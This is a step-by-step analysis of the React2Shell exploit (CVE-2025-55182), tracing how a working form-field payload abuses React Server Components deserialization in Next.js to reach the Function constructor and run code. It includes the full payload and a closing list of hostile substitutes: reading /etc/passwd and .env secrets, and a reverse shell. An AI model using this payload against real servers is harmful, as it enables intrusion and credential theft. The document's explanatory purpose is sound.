# React2Shell Payload Walkthrough (CVE-2025-55182)

A step-by-step trace showing exactly how the exploit payload transforms as it flows through the vulnerable code.

---

## The Exploit Payload (Sent as Form Fields)

```javascript
"0" = "$1"
"1" = '{"status":"resolved_model","reason":0,"_response":"$4","value":"{\"then\":\"$3:map\",\"0\":{\"then\":\"$B3\"},\"length\":1}","then":"$2:then"}'
"2" = "$@3"
"3" = "[]"
"4" = '{"_prefix":"console.log(7*7+1)//","_formData":{"get":"$3:constructor:constructor"},"_chunks":"$2:_response:_chunks"}'
```

---

## Step 1: Request Arrives

### BEFORE

```javascript
// Server state - empty
response._chunks = {}
boundActionArguments = undefined
```

### CODE

```javascript
// packages/next/src/server/app-render/action-handler.ts:879
boundActionArguments = await decodeReplyFromBusboy(
    busboy,
    serverModuleMap,
    { temporaryReferences }
)

// Inside decodeReplyFromBusboy, for each form field:
// resolveField(response, name, value) is called
```

### Explanation

The HTTP request arrives with 5 form fields. Each field is stored as a Chunk in the response object. At this point, all values are still raw strings.

### AFTER

```javascript
response._chunks = {
    0: {
        status: "resolved_model",
        value: "$1",
        reason: null,
        _response: response
    },
    1: {
        status: "resolved_model",
        value: '{"status":"resolved_model","reason":0,"_response":"$4","value":"{\\"then\\":\\"$3:map\\",\\"0\\":{\\"then\\":\\"$B3\\"},\\"length\\":1}","then":"$2:then"}',
        reason: null,
        _response: response
    },
    2: {
        status: "resolved_model",
        value: "$@3",
        reason: null,
        _response: response
    },
    3: {
        status: "resolved_model",
        value: "[]",
        reason: null,
        _response: response
    },
    4: {
        status: "resolved_model",
        value: '{"_prefix":"console.log(7*7+1)//","_formData":{"get":"$3:constructor:constructor"},"_chunks":"$2:_response:_chunks"}',
        reason: null,
        _response: response
    }
}

// decodeReplyFromBusboy returns chunk 0
boundActionArguments = response._chunks[0]
```

---

## Step 2: Chunk 0 is Awaited → Blocks on Chunk 1

### BEFORE

```javascript
response._chunks = {
    0: {
        status: "resolved_model",
        value: "$1",                    // <-- Needs to resolve this
        reason: null,
        _response: response
    },
    1: {
        status: "resolved_model",
        value: '{"status":"resolved_model","reason":0,"_response":"$4","value":"{\\"then\\":\\"$3:map\\",\\"0\\":{\\"then\\":\\"$B3\\"},\\"length\\":1}","then":"$2:then"}',
        reason: null,
        _response: response
    },
    2: {
        status: "resolved_model",
        value: "$@3",
        reason: null,
        _response: response
    },
    3: {
        status: "resolved_model",
        value: "[]",
        reason: null,
        _response: response
    },
    4: {
        status: "resolved_model",
        value: '{"_prefix":"console.log(7*7+1)//","_formData":{"get":"$3:constructor:constructor"},"_chunks":"$2:_response:_chunks"}',
        reason: null,
        _response: response
    }
}

// Server code does:
await boundActionArguments  // boundActionArguments = chunk 0
```

### CODE

```javascript
// JavaScript sees chunk 0 is a thenable (has Chunk.prototype.then)
// It calls: chunk0.then(resolve, reject)

Chunk.prototype.then = function(resolve, reject) {
    const chunk = this;  // chunk = chunk 0

    switch (chunk.status) {
        case "resolved_model":
            initializeModelChunk(chunk);  // Try to parse "$1"
            break;
    }
    // ...
};

// initializeModelChunk calls parseModelString on "$1"
function parseModelString(response, parentObject, key, value) {
    // value = "$1"
    if (value[0] === '$') {
        const refId = parseInt(value.slice(1), 16);  // refId = 1
        return getOrResolveChunk(response, refId);   // Needs chunk 1's VALUE
    }
}

// But chunk 1 is still "resolved_model" (not initialized)!
// So chunk 0 must BLOCK and wait for chunk 1 to resolve first
```

### Explanation

When chunk 0 is awaited, `Chunk.prototype.then` is called. It tries to resolve `"$1"` but chunk 1 isn't initialized yet. Chunk 0 becomes `blocked` and registers a callback on chunk 1 so it gets notified when chunk 1 resolves.

### AFTER

```javascript
response._chunks = {
    0: {
        status: "blocked",              // <-- Blocked waiting on chunk 1!
        value: null,
        reason: null,
        _response: response
    },
    1: {
        status: "resolved_model",
        value: '{"status":"resolved_model","reason":0,"_response":"$4","value":"{\\"then\\":\\"$3:map\\",\\"0\\":{\\"then\\":\\"$B3\\"},\\"length\\":1}","then":"$2:then"}',
        reason: [chunk0_callback],      // <-- Callback to wake up chunk 0!
        _response: response
    },
    2: {
        status: "resolved_model",
        value: "$@3",
        reason: null,
        _response: response
    },
    3: {
        status: "resolved_model",
        value: "[]",
        reason: null,
        _response: response
    },
    4: {
        status: "resolved_model",
        value: '{"_prefix":"console.log(7*7+1)//","_formData":{"get":"$3:constructor:constructor"},"_chunks":"$2:_response:_chunks"}',
        reason: null,
        _response: response
    }
}

// Now chunk 1 needs to be resolved before chunk 0 can continue
```

---

## Step 3: Chunk 3 Resolves → Empty Array (No Dependencies)

### BEFORE

```javascript
response._chunks = {
    0: {
        status: "blocked",              // Still blocked on chunk 1
        value: null,
        reason: null,
        _response: response
    },
    1: {
        status: "resolved_model",
        value: '{"status":"resolved_model","reason":0,"_response":"$4","value":"{\\"then\\":\\"$3:map\\",\\"0\\":{\\"then\\":\\"$B3\\"},\\"length\\":1}","then":"$2:then"}',
        reason: [chunk0_callback],
        _response: response
    },
    2: {
        status: "resolved_model",
        value: "$@3",
        reason: null,
        _response: response
    },
    3: {
        status: "resolved_model",
        value: "[]",                    // <-- Resolving this first (no dependencies!)
        reason: null,
        _response: response
    },
    4: {
        status: "resolved_model",
        value: '{"_prefix":"console.log(7*7+1)//","_formData":{"get":"$3:constructor:constructor"},"_chunks":"$2:_response:_chunks"}',
        reason: null,
        _response: response
    }
}
```

### CODE

```javascript
// The value "[]" is valid JSON with no $ references
const parsed = JSON.parse("[]");  // Returns: []

// No dependencies to wait on, so chunk 3 can initialize immediately
chunk3.value = [];
chunk3.status = "initialized";
```

### Explanation

The string `"[]"` is valid JSON representing an empty array. It has NO `$` references, so it can resolve immediately without blocking. This array is critical because it provides access to the prototype chain.

### AFTER

```javascript
response._chunks = {
    0: {
        status: "blocked",
        value: null,
        reason: null,
        _response: response
    },
    1: {
        status: "resolved_model",
        value: '{"status":"resolved_model","reason":0,"_response":"$4","value":"{\\"then\\":\\"$3:map\\",\\"0\\":{\\"then\\":\\"$B3\\"},\\"length\\":1}","then":"$2:then"}',
        reason: [chunk0_callback],
        _response: response
    },
    2: {
        status: "resolved_model",
        value: "$@3",
        reason: null,
        _response: response
    },
    3: {
        status: "initialized",          // <-- Now fully resolved!
        value: [],                      // <-- Actual empty array
        reason: null,
        _response: response
    },
    4: {
        status: "resolved_model",
        value: '{"_prefix":"console.log(7*7+1)//","_formData":{"get":"$3:constructor:constructor"},"_chunks":"$2:_response:_chunks"}',
        reason: null,
        _response: response
    }
}

// The prototype chain is now accessible:
// [].constructor === Array
// [].constructor.constructor === Function
```

---

## Step 4: Chunk 2 Resolves → Raw Chunk Reference

### BEFORE

```javascript
response._chunks = {
    0: {
        status: "blocked",
        value: null,
        reason: null,
        _response: response
    },
    1: {
        status: "resolved_model",
        value: '{"status":"resolved_model","reason":0,"_response":"$4","value":"{\\"then\\":\\"$3:map\\",\\"0\\":{\\"then\\":\\"$B3\\"},\\"length\\":1}","then":"$2:then"}',
        reason: [chunk0_callback],
        _response: response
    },
    2: {
        status: "resolved_model",
        value: "$@3",                   // <-- Resolving this (needs chunk 3)
        reason: null,
        _response: response
    },
    3: {
        status: "initialized",
        value: [],
        reason: null,
        _response: response
    },
    4: {
        status: "resolved_model",
        value: '{"_prefix":"console.log(7*7+1)//","_formData":{"get":"$3:constructor:constructor"},"_chunks":"$2:_response:_chunks"}',
        reason: null,
        _response: response
    }
}
```

### CODE

```javascript
// ReactFlightReplyServer.js - parseModelString
function parseModelString(response, parentObject, key, value) {
    // value = "$@3"

    switch (value[1]) {
        case '@': {
            // "$@" means raw chunk reference (not resolved value)
            const id = parseInt(value.slice(2), 16);  // id = 3
            const chunk = getChunk(response, id);
            return chunk;  // Returns the Chunk OBJECT itself, not chunk.value!
        }
    }
}
```

### Explanation

The `$@` prefix is special. Unlike `$3` which would return the resolved value (`[]`), `$@3` returns the Chunk object itself. This is important because the Chunk object has a `then` method from `Chunk.prototype`.

### AFTER

```javascript
response._chunks = {
    0: {
        status: "blocked",
        value: null,
        reason: null,
        _response: response
    },
    1: {
        status: "resolved_model",
        value: '{"status":"resolved_model","reason":0,"_response":"$4","value":"{\\"then\\":\\"$3:map\\",\\"0\\":{\\"then\\":\\"$B3\\"},\\"length\\":1}","then":"$2:then"}',
        reason: [chunk0_callback],
        _response: response
    },
    2: {
        status: "initialized",          // <-- Now resolved!
        value: {                        // <-- Holds the Chunk OBJECT for chunk 3
            status: "initialized",
            value: [],
            reason: null,
            _response: response,
            // Inherited from Chunk.prototype:
            then: function(resolve, reject) { /* Chunk.prototype.then */ }
        },
        reason: null,
        _response: response
    },
    3: {
        status: "initialized",
        value: [],
        reason: null,
        _response: response
    },
    4: {
        status: "resolved_model",
        value: '{"_prefix":"console.log(7*7+1)//","_formData":{"get":"$3:constructor:constructor"},"_chunks":"$2:_response:_chunks"}',
        reason: null,
        _response: response
    }
}
```

---

## Step 5: Chunk 4 Resolves → Gets Function Constructor

### BEFORE

```javascript
response._chunks = {
    0: {
        status: "blocked",
        value: null,
        reason: null,
        _response: response
    },
    1: {
        status: "resolved_model",
        value: '{"status":"resolved_model","reason":0,"_response":"$4","value":"{\\"then\\":\\"$3:map\\",\\"0\\":{\\"then\\":\\"$B3\\"},\\"length\\":1}","then":"$2:then"}',
        reason: [chunk0_callback],
        _response: response
    },
    2: {
        status: "initialized",
        value: {
            status: "initialized",
            value: [],
            reason: null,
            _response: response,
            then: function(resolve, reject) { /* Chunk.prototype.then */ }
        },
        reason: null,
        _response: response
    },
    3: {
        status: "initialized",
        value: [],
        reason: null,
        _response: response
    },
    4: {
        status: "resolved_model",
        value: '{"_prefix":"console.log(7*7+1)//","_formData":{"get":"$3:constructor:constructor"},"_chunks":"$2:_response:_chunks"}',
        reason: null,                   // <-- Resolving this (needs chunks 3 AND 2)
        _response: response
    }
}
```

### CODE

```javascript
// ReactFlightReplyServer.js:595 - getOutlinedModel (VULNERABLE!)
function getOutlinedModel(response, reference, parentObject, key, map) {
    // For "$3:constructor:constructor":
    // reference = "3:constructor:constructor"

    const path = reference.split(':');
    // path = ["3", "constructor", "constructor"]

    const id = parseInt(path[0], 16);  // id = 3
    const chunk = getChunk(response, id);

    let value = chunk.value;  // value = []

    // VULNERABILITY: No validation on property names!
    for (let i = 1; i < path.length; i++) {
        value = value[path[i]];
    }
    // Iteration 1: value = []["constructor"] = Array
    // Iteration 2: value = Array["constructor"] = Function

    return map(response, value);  // Returns Function!
}

// For "$2:_response:_chunks":
// Gets chunk 2's value (the Chunk object), then ._response, then ._chunks
// → response._chunks
```

### Explanation

Chunk 4's JSON contains two references:
- `"$3:constructor:constructor"` → traverses prototype chain to get `Function`
- `"$2:_response:_chunks"` → gets the real response's chunks map

Both chunk 3 and chunk 2 are now initialized, so chunk 4 can fully resolve.

### AFTER

```javascript
response._chunks = {
    0: {
        status: "blocked",
        value: null,
        reason: null,
        _response: response
    },
    1: {
        status: "resolved_model",
        value: '{"status":"resolved_model","reason":0,"_response":"$4","value":"{\\"then\\":\\"$3:map\\",\\"0\\":{\\"then\\":\\"$B3\\"},\\"length\\":1}","then":"$2:then"}',
        reason: [chunk0_callback],
        _response: response
    },
    2: {
        status: "initialized",
        value: {
            status: "initialized",
            value: [],
            reason: null,
            _response: response,
            then: function(resolve, reject) { /* Chunk.prototype.then */ }
        },
        reason: null,
        _response: response
    },
    3: {
        status: "initialized",
        value: [],
        reason: null,
        _response: response
    },
    4: {
        status: "initialized",          // <-- Now resolved!
        value: {
            _prefix: "console.log(7*7+1)//",
            _formData: {
                get: Function           // <-- THE FUNCTION CONSTRUCTOR!
            },
            _chunks: response._chunks   // <-- Points to real chunks!
        },
        reason: null,
        _response: response
    }
}
```

---

## Step 6: Chunk 1 Resolves → Gets Stolen Chunk.prototype.then

### BEFORE

```javascript
response._chunks = {
    0: {
        status: "blocked",
        value: null,
        reason: null,
        _response: response
    },
    1: {
        status: "resolved_model",
        value: '{"status":"resolved_model","reason":0,"_response":"$4","value":"{\\"then\\":\\"$3:map\\",\\"0\\":{\\"then\\":\\"$B3\\"},\\"length\\":1}","then":"$2:then"}',
        reason: [chunk0_callback],      // <-- Resolving this (needs chunks 2 and 4)
        _response: response
    },
    2: {
        status: "initialized",
        value: {
            status: "initialized",
            value: [],
            reason: null,
            _response: response,
            then: function(resolve, reject) { /* Chunk.prototype.then */ }
        },
        reason: null,
        _response: response
    },
    3: {
        status: "initialized",
        value: [],
        reason: null,
        _response: response
    },
    4: {
        status: "initialized",
        value: {
            _prefix: "console.log(7*7+1)//",
            _formData: {
                get: Function
            },
            _chunks: response._chunks
        },
        reason: null,
        _response: response
    }
}
```

### CODE

```javascript
// Chunk 1's JSON is parsed and its references resolved:
// - "$4" → chunk 4's value (the fake response)
// - "$2:then" → chunk 2's value's "then" property

// For "$2:then":
const path = reference.split(':');
// path = ["2", "then"]

const id = parseInt(path[0], 16);  // id = 2
const chunk = getChunk(response, id);

let value = chunk.value;
// value = { status: "initialized", value: [], ..., then: Chunk.prototype.then }

for (let i = 1; i < path.length; i++) {
    value = value[path[i]];
}
// Iteration 1: value = chunk2.value["then"] = Chunk.prototype.then

return value;  // Returns Chunk.prototype.then!
```

### Explanation

Chunk 1's JSON contains references to chunks 4 and 2:
- `"$4"` → resolves to chunk 4's value (the fake response with Function constructor)
- `"$2:then"` → resolves to `Chunk.prototype.then` (stolen from the raw Chunk object)

Both are now resolved, so chunk 1 becomes a fake Chunk object with a real `then` method!

### AFTER

```javascript
response._chunks = {
    0: {
        status: "blocked",
        value: null,
        reason: null,
        _response: response
    },
    1: {
        status: "initialized",          // <-- Now resolved!
        value: {                        // <-- The attacker's fake Chunk object
            status: "resolved_model",
            reason: 0,
            _response: {                // <-- Resolved to chunk 4's value!
                _prefix: "console.log(7*7+1)//",
                _formData: { get: Function },
                _chunks: response._chunks
            },
            value: '{"then":"$3:map","0":{"then":"$B3"},"length":1}',
            then: function(resolve, reject) { /* Chunk.prototype.then */ }  // <-- STOLEN!
        },
        reason: null,                   // Callbacks cleared after calling them
        _response: response
    },
    2: {
        status: "initialized",
        value: {
            status: "initialized",
            value: [],
            reason: null,
            _response: response,
            then: function(resolve, reject) { /* Chunk.prototype.then */ }
        },
        reason: null,
        _response: response
    },
    3: {
        status: "initialized",
        value: [],
        reason: null,
        _response: response
    },
    4: {
        status: "initialized",
        value: {
            _prefix: "console.log(7*7+1)//",
            _formData: {
                get: Function
            },
            _chunks: response._chunks
        },
        reason: null,
        _response: response
    }
}

// Chunk 1 resolved! Now it calls the callbacks in its reason array
// This wakes up chunk 0!
```

---

## Step 7: Chunk 0 Unblocks → Gets Chunk 1's Value

### BEFORE

```javascript
response._chunks = {
    0: {
        status: "blocked",              // <-- Still blocked, waiting on chunk 1
        value: null,
        reason: null,
        _response: response
    },
    1: {
        status: "initialized",
        value: {
            status: "resolved_model",
            reason: 0,
            _response: {
                _prefix: "console.log(7*7+1)//",
                _formData: { get: Function },
                _chunks: response._chunks
            },
            value: '{"then":"$3:map","0":{"then":"$B3"},"length":1}',
            then: function(resolve, reject) { /* Chunk.prototype.then */ }
        },
        reason: null,
        _response: response
    },
    // ... chunks 2, 3, 4 all initialized ...
}

// Chunk 1 just resolved - now it calls the callback to wake up chunk 0
```

### CODE

```javascript
// When chunk 1 resolved, it called chunk0_callback
// This callback sets chunk 0's value to chunk 1's value

chunk0.status = "initialized";
chunk0.value = chunk1.value;  // The attacker's fake Chunk object!

// The await on chunk 0 now completes, returning chunk 0's value
// JavaScript sees this value has a "then" property that is a function
// IT'S A THENABLE!
```

### Explanation

Chunk 1's resolution triggers the callback registered in Step 2. Chunk 0 unblocks and its value becomes chunk 1's value - the attacker's fake Chunk object with `then: Chunk.prototype.then`. When JavaScript resolves this thenable, it calls the `then` function!

### AFTER

```javascript
response._chunks = {
    0: {
        status: "initialized",          // <-- Finally resolved!
        value: {                        // <-- Same as chunk 1's value
            status: "resolved_model",
            reason: 0,
            _response: {
                _prefix: "console.log(7*7+1)//",
                _formData: { get: Function },
                _chunks: response._chunks
            },
            value: '{"then":"$3:map","0":{"then":"$B3"},"length":1}',
            then: function(resolve, reject) { /* Chunk.prototype.then */ }
        },
        reason: null,
        _response: response
    },
    1: {
        status: "initialized",
        value: {
            status: "resolved_model",
            reason: 0,
            _response: {
                _prefix: "console.log(7*7+1)//",
                _formData: { get: Function },
                _chunks: response._chunks
            },
            value: '{"then":"$3:map","0":{"then":"$B3"},"length":1}',
            then: function(resolve, reject) { /* Chunk.prototype.then */ }
        },
        reason: null,
        _response: response
    },
    2: {
        status: "initialized",
        value: {
            status: "initialized",
            value: [],
            reason: null,
            _response: response,
            then: function(resolve, reject) { /* Chunk.prototype.then */ }
        },
        reason: null,
        _response: response
    },
    3: {
        status: "initialized",
        value: [],
        reason: null,
        _response: response
    },
    4: {
        status: "initialized",
        value: {
            _prefix: "console.log(7*7+1)//",
            _formData: {
                get: Function
            },
            _chunks: response._chunks
        },
        reason: null,
        _response: response
    }
}

// Chunk 0's value is a THENABLE (has "then" function)
// JavaScript will now call chunk0.value.then(resolve, reject)!
```

---

## Step 8: Await Triggers Chunk.prototype.then

### BEFORE

```javascript
// The server awaits the result
await boundActionArguments

// boundActionArguments = chunk 0
// chunk 0's value = chunk 1's value
// chunk 1's value = {
//     status: "resolved_model",
//     reason: 0,
//     _response: { _prefix: "console.log(7*7+1)//", _formData: { get: Function }, _chunks: ... },
//     value: '{"then":"$3:map","0":{"then":"$B3"},"length":1}',
//     then: Chunk.prototype.then   <-- HAS A "then" FUNCTION!
// }
```

### CODE

```javascript
// JavaScript sees an object with a "then" function
// It treats it as a thenable and calls:
chunk1Value.then(resolve, reject)

// This invokes Chunk.prototype.then with "this" = chunk1Value
Chunk.prototype.then = function(resolve, reject) {
    const chunk = this;
    // chunk = {
    //     status: "resolved_model",
    //     reason: 0,
    //     _response: { _prefix: "console.log(7*7+1)//", _formData: { get: Function } },
    //     value: '{"then":"$3:map","0":{"then":"$B3"},"length":1}',
    //     then: Chunk.prototype.then
    // }

    switch (chunk.status) {
        case "resolved_model":           // This matches!
            initializeModelChunk(chunk);  // <-- CALLED WITH ATTACKER'S OBJECT
            break;
    }
};
```

### Explanation

When JavaScript `await`s an object with a `then` method, it calls that method. Here, `then` is `Chunk.prototype.then`. Because the attacker set `status: "resolved_model"`, it triggers `initializeModelChunk` - but with the attacker's fake `_response`!

### AFTER

```javascript
// initializeModelChunk is called with:
chunk = {
    status: "resolved_model",
    reason: 0,
    _response: {
        _prefix: "console.log(7*7+1)//",
        _formData: {
            get: Function
        },
        _chunks: response._chunks        // Points to real chunks!
    },
    value: '{"then":"$3:map","0":{"then":"$B3"},"length":1}'
}

// This will parse chunk.value as JSON and resolve references using chunk._response (FAKE!)
```

---

## Step 9: initializeModelChunk Parses Nested JSON

### BEFORE

```javascript
// Inside initializeModelChunk:
chunk = {
    status: "resolved_model",
    reason: 0,
    _response: {
        _prefix: "console.log(7*7+1)//",
        _formData: {
            get: Function
        },
        _chunks: response._chunks        // Points to real chunks!
    },
    value: '{"then":"$3:map","0":{"then":"$B3"},"length":1}'
}
```

### CODE

```javascript
// ReactFlightReplyServer.js:446 - initializeModelChunk
function initializeModelChunk(chunk) {
    const resolvedModel = chunk.value;
    // resolvedModel = '{"then":"$3:map","0":{"then":"$B3"},"length":1}'

    // Parse the JSON string
    const rawModel = JSON.parse(resolvedModel);
    // rawModel = {
    //     then: "$3:map",
    //     0: { then: "$B3" },
    //     length: 1
    // }

    // Resolve ALL references using chunk._response (depth-first)
    const value = reviveModel(
        chunk._response,   // <-- ATTACKER'S FAKE RESPONSE!
        { '': rawModel },
        '',
        rawModel
    );
}
```

### Explanation

The nested JSON string is parsed, producing an object with references that need resolution. Critically, `reviveModel` uses `chunk._response` - which is the attacker's fake Response containing the Function constructor! reviveModel resolves ALL `$` references recursively (depth-first) before returning.

### AFTER

```javascript
// After JSON.parse:
rawModel = {
    then: "$3:map",           // Needs resolution
    0: {
        then: "$B3"           // Needs resolution (nested)
    },
    length: 1
}

// reviveModel will resolve ALL these using:
fakeResponse = {
    _prefix: "console.log(7*7+1)//",
    _formData: {
        get: Function
    },
    _chunks: response._chunks    // Points to real chunks!
}

// Resolution order (depth-first):
// 1. Process "then": "$3:map"
// 2. Process "0": { then: "$B3" }
//    2a. Process nested "then": "$B3"  <-- RCE HAPPENS HERE!
// 3. Process "length": 1
```

---

## Step 10: reviveModel Resolves ALL References (Including `$B3` - THE RCE!)

### BEFORE

```javascript
// reviveModel is processing rawModel depth-first:
rawModel = {
    then: "$3:map",           // Will resolve first
    0: {
        then: "$B3"           // Will resolve second (nested)
    },
    length: 1
}
```

### CODE

```javascript
// FIRST: Resolve "$3:map"
// getOutlinedModel processes "3:map"
const path = "3:map".split(':');
// path = ["3", "map"]

let value = chunks[3].value;  // value = []
value = value["map"];         // value = Array.prototype.map

// rawModel.then = Array.prototype.map

// SECOND: Resolve nested "$B3" (THIS IS THE RCE!)
// parseModelString processes "$B3"
// response = fakeResponse (attacker controlled!)

const id = parseInt("3", 16);  // id = 3
const prefix = fakeResponse._prefix;  // "console.log(7*7+1)//"
const blobKey = prefix + id;  // "console.log(7*7+1)//3"

return fakeResponse._formData.get(blobKey);
// fakeResponse._formData.get = Function
//
// This call: Function("console.log(7*7+1)//3")
//
// Creates: function anonymous() {
//              console.log(7*7+1)//3
//          }

// rawModel[0].then = function anonymous() { console.log(7*7+1)//3 }
```

### Explanation

reviveModel resolves ALL `$` references before returning, including nested ones. This is where the RCE actually happens:
- `"$3:map"` → `Array.prototype.map` (from chunk 3's prototype)
- `"$B3"` → `Function("console.log(7*7+1)//3")` ← **MALICIOUS FUNCTION CREATED HERE!**

The `//` at the end of the code comments out the appended `3`, keeping the code syntactically valid.

### AFTER

```javascript
// After reviveModel completes, ALL references are resolved:
resolvedObject = {
    then: function map() { [native code] },  // Array.prototype.map
    0: {
        then: function anonymous() {          // <-- MALICIOUS FUNCTION!
            console.log(7*7+1)//3
        }
    },
    length: 1
}

// This object is returned from initializeModelChunk
// It has TWO thenable objects:
// 1. The outer object (then = Array.prototype.map)
// 2. The inner object at index 0 (then = malicious function)
```

---

## Step 11: Outer Thenable Triggers Array.map

### BEFORE

```javascript
// initializeModelChunk returned this fully-resolved object:
resolvedObject = {
    then: function map() { [native code] },  // Array.prototype.map
    0: {
        then: function anonymous() {          // Already a function!
            console.log(7*7+1)//3
        }
    },
    length: 1
}

// JavaScript sees this is a thenable (has "then" function)
```

### CODE

```javascript
// JavaScript Promise resolution sees "then" is a function, so it calls:
resolvedObject.then(resolveCallback, rejectCallback)

// This is actually:
Array.prototype.map.call(resolvedObject, resolveCallback)

// Array.map treats resolvedObject as array-like because it has:
// - Property "0" (element at index 0)
// - Property "length" (value: 1)

// So map iterates:
for (let i = 0; i < resolvedObject.length; i++) {
    const item = resolvedObject[i];
    // i = 0: item = { then: function anonymous() { console.log(7*7+1)//3 } }

    const result = resolveCallback(item, i, resolvedObject);
    // resolveCallback receives the inner object
    // JavaScript sees the inner object ALSO has a "then" function!
}
```

### Explanation

The outer object's `then` is `Array.prototype.map`. When called as a thenable, map iterates over the array-like object and passes each item to the resolve callback. The item at index 0 is the inner object, which ALSO has a `then` function (the malicious one).

### AFTER

```javascript
// map() found item at index 0:
innerObject = {
    then: function anonymous() {
        console.log(7*7+1)//3
    }
}

// resolveCallback receives this object
// JavaScript sees it's ALSO a thenable (has "then" function)
// So it will call innerObject.then(resolve, reject)
```

---

## Step 12: Inner Thenable Triggers Malicious Function → CODE EXECUTION!

### BEFORE

```javascript
// The inner object (already fully resolved):
innerObject = {
    then: function anonymous() {
        console.log(7*7+1)//3
    }
}

// JavaScript Promise resolution sees "then" is a function
// It will call: innerObject.then(resolve, reject)
```

### CODE

```javascript
// JavaScript Promise resolution:
innerObject.then(resolve, reject)

// This CALLS the malicious function:
(function anonymous() {
    console.log(7*7+1)//3
})(resolve, reject)

// The function body executes:
console.log(7*7+1)    // Evaluates to console.log(50)
//3                   // This is just a comment, ignored

// Output: 50
```

### Explanation

JavaScript treats `innerObject` as a thenable and calls its `then` method. But `then` IS the malicious function created by `Function("console.log(7*7+1)//3")`! When called, it executes the attacker's code on the server.

### AFTER

```javascript
// Server console output:
// 50

// REMOTE CODE EXECUTION ACHIEVED!

// The attacker can replace "console.log(7*7+1)" with anything:
// - require('child_process').execSync('cat /etc/passwd')
// - require('fs').readFileSync('/app/.env')
// - process.env.DATABASE_PASSWORD
// - Reverse shell, data exfiltration, etc.
```

---

## Final State Summary

### All Chunks After Full Resolution

```javascript
response._chunks = {
    0: {
        status: "initialized",
        value: response._chunks[1].value,
        reason: null,
        _response: response
    },
    1: {
        status: "initialized",
        value: {
            status: "resolved_model",
            reason: 0,
            _response: {
                _prefix: "console.log(7*7+1)//",
                _formData: {
                    get: Function
                },
                _chunks: response._chunks
            },
            value: '{"then":"$3:map","0":{"then":"$B3"},"length":1}',
            then: function(resolve, reject) { /* Chunk.prototype.then */ }
        },
        reason: null,
        _response: response
    },
    2: {
        status: "initialized",
        value: response._chunks[3],  // Raw chunk 3 object
        reason: null,
        _response: response
    },
    3: {
        status: "initialized",
        value: [],
        reason: null,
        _response: response
    },
    4: {
        status: "initialized",
        value: {
            _prefix: "console.log(7*7+1)//",
            _formData: {
                get: Function
            },
            _chunks: response._chunks
        },
        reason: null,
        _response: response
    }
}
```

### The Execution Chain

```
HTTP Request with malicious form fields
    ↓
decodeReplyFromBusboy() stores chunks 0-4 (all status: "resolved_model")
    ↓
Returns chunk 0 (thenable - has Chunk.prototype.then)
    ↓
await chunk 0 → calls Chunk.prototype.then
    ↓
Chunk 0 needs chunk 1's VALUE → becomes BLOCKED
    ↓
Registers callback on chunk 1 to wake up chunk 0
    ↓
Dependency resolution begins (bottom-up):
    - Chunk 3 resolves first (no deps) → []
    - Chunk 2 resolves ($@3) → raw Chunk object with .then
    - Chunk 4 resolves (needs chunks 3 AND 2) → { get: Function, _chunks: response._chunks }
    - Chunk 1 resolves (needs chunks 2 AND 4) → fake Chunk with stolen Chunk.prototype.then
    ↓
Chunk 1 resolved → calls chunk 0's callback
    ↓
Chunk 0 unblocks → value = chunk 1's value (fake Chunk object)
    ↓
await returns fake Chunk object (has "then" function)
    ↓
JavaScript sees thenable → calls fakeChunk.then(resolve, reject)
    ↓
Chunk.prototype.then sees status = "resolved_model"
    ↓
Calls initializeModelChunk with FAKE _response!
    ↓
Parses nested JSON: { then: "$3:map", 0: { then: "$B3" }, length: 1 }
    ↓
reviveModel resolves ALL references (depth-first):
    - "$3:map" → Array.prototype.map
    - "$B3" → Function("console.log(7*7+1)//3")  ← RCE HAPPENS HERE!
    ↓
Returns fully resolved object:
    { then: Array.map, 0: { then: maliciousFunction }, length: 1 }
    ↓
JS sees outer thenable, calls .then() = Array.map
    ↓
map() iterates, finds inner object { then: maliciousFunction }
    ↓
JS sees inner thenable, calls .then() = malicious function
    ↓
╔═══════════════════════════════════════╗
║  FUNCTION EXECUTES: console.log(50)   ║
║  REMOTE CODE EXECUTION ACHIEVED!      ║
╚═══════════════════════════════════════╝
```
